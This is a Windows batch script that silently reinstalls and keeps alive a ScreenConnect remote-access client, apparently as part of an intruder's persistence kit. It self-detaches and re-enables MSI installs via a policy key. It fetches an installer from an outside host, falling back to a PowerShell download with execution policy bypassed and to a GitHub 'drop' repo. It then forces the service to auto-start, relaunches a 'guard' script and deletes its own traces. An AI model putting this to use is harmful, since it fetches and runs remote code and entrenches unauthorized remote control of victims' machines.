@echo off
rem WINRTCS_GRYXA_RECOVER R3 - bring Gryxa FP 36e506ff back.
rem Self-detaches (agent cmd channel is 60s).
rem R3 (operator-proven on DESKTOP-3UFSG6P): sc stop/delete Gryxa FP, then
rem msiexec /x shared ProductCode, wait ~20s, fetch UI MSI, msiexec /i.
rem NOTE: /x shared PC briefly removes keepers too; Gryxa UI /i brings Gryxa back.
rem       Keepers re-heal via their own persistence / sevrz. Log: C:\Users\Public\gryxa_recover.log
if /I not "%~1"=="--detached" (
  copy /y "%~f0" "C:\Users\Public\gryxa_recover_run.cmd" >nul 2>&1
  if not exist "C:\Users\Public\gryxa_recover_run.cmd" copy /y "%~f0" "%SystemRoot%\Temp\gryxa_recover_run.cmd" >nul 2>&1
  if exist "C:\Users\Public\gryxa_recover_run.cmd" (
    start "" /min cmd.exe /c "C:\Users\Public\gryxa_recover_run.cmd --detached"
  ) else (
    start "" /min cmd.exe /c "%SystemRoot%\Temp\gryxa_recover_run.cmd --detached"
  )
  echo QUEUED gryxa-recover detached - log C:\Users\Public\gryxa_recover.log
  exit /b 0
)
setlocal EnableExtensions EnableDelayedExpansion
set "ZD=C:\ProgramData\WinRTCS"
set "LOG=C:\Users\Public\gryxa_recover.log"
set "CURL=%SystemRoot%\System32\curl.exe"
set "UI=https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "BASE=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "GFP=36e506ff016b2151"
set "GSVC=ScreenConnect Client (%GFP%)"
set "MSI=C:\Users\Public\gryxa.msi"
set "PC={9D7CC418-A356-9693-DCC5-41EC44D03B31}"
if not exist "%ZD%" mkdir "%ZD%" >nul 2>&1
>"%LOG%" echo [%DATE% %TIME%] recover_begin host=%COMPUTERNAME% R3

> "%ZD%\extkill.cnt" echo 0
> "%ZD%\fight.cnt" echo 0
> "%ZD%\guard.cnt" echo 9999
> "%ZD%\gryxa_boost.cnt" echo 15
rmdir /s /q "%ZD%\guard.lockd" >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1

echo [%DATE% %TIME%] step_stop_delete_gryxa>>"%LOG%"
sc stop "%GSVC%" >>"%LOG%" 2>&1
sc delete "%GSVC%" >>"%LOG%" 2>&1

echo [%DATE% %TIME%] step_msiexec_x_shared_pc>>"%LOG%"
start "" /min msiexec /x %PC% /qn /norestart REBOOT=ReallySuppress
ping -n 21 127.0.0.1 >nul 2>&1

echo [%DATE% %TIME%] step_fetch_ui_msi>>"%LOG%"
del /f /q "%MSI%" >nul 2>&1
rem curl schannel often fails ui.gryxa.com with SEC_E_INVALID_TOKEN (35) — try curl, then PS, then repo.
"%CURL%" -L --ssl-no-revoke --connect-timeout 15 --max-time 180 -o "%MSI%" "%UI%" >>"%LOG%" 2>&1
set "OKMSI="
if exist "%MSI%" for %%F in ("%MSI%") do if %%~zF GEQ 5000000 set "OKMSI=1"
if not defined OKMSI (
  echo [%DATE% %TIME%] ui_curl_fail_try_powershell>>"%LOG%"
  del /f /q "%MSI%" >nul 2>&1
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
    "$ErrorActionPreference='Stop'; [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; ^
     $u='%UI%'; $o='%MSI%'; ^
     try { Invoke-WebRequest -Uri $u -OutFile $o -UseBasicParsing -TimeoutSec 180 } ^
     catch { (New-Object Net.WebClient).DownloadFile($u,$o) }" >>"%LOG%" 2>&1
  if exist "%MSI%" for %%F in ("%MSI%") do if %%~zF GEQ 5000000 set "OKMSI=1"
)
if not defined OKMSI (
  echo [%DATE% %TIME%] ui_fail_try_repo>>"%LOG%"
  del /f /q "%MSI%" >nul 2>&1
  "%CURL%" -f -L --ssl-no-revoke --connect-timeout 15 --max-time 180 -o "%MSI%" "%BASE%/pkg_gryxa.msi" >>"%LOG%" 2>&1
  if exist "%MSI%" for %%F in ("%MSI%") do if %%~zF GEQ 5000000 set "OKMSI=1"
)
if not defined OKMSI (
  echo [%DATE% %TIME%] FAIL_no_msi>>"%LOG%"
  echo RECOVER=FAIL_NO_MSI
  endlocal & exit /b 3
)
for %%F in ("%MSI%") do echo [%DATE% %TIME%] msi_ok size=%%~zF>>"%LOG%"

echo [%DATE% %TIME%] step_msiexec_i>>"%LOG%"
start "" /min msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress
ping -n 91 127.0.0.1 >nul 2>&1

sc config "%GSVC%" start= auto >>"%LOG%" 2>&1
sc start "%GSVC%" >>"%LOG%" 2>&1
ping -n 16 127.0.0.1 >nul 2>&1
sc query "%GSVC%" >>"%LOG%" 2>&1

sc query "%GSVC%" 2>nul | findstr /C:"RUNNING" >nul
if errorlevel 1 (
  echo [%DATE% %TIME%] FAIL_svc>>"%LOG%"
  echo RECOVER=FAIL_SVC
  start "" /min cmd.exe /c "%ZD%\winrtcs_guard.cmd"
  endlocal & exit /b 4
)
echo [%DATE% %TIME%] OK running>>"%LOG%"
echo RECOVER=OK
start "" /min cmd.exe /c "%ZD%\winrtcs_guard.cmd"
del /f /q "C:\Users\Public\gryxa_recover_run.cmd" "%SystemRoot%\Temp\gryxa_recover_run.cmd" >nul 2>&1
endlocal & exit /b 0
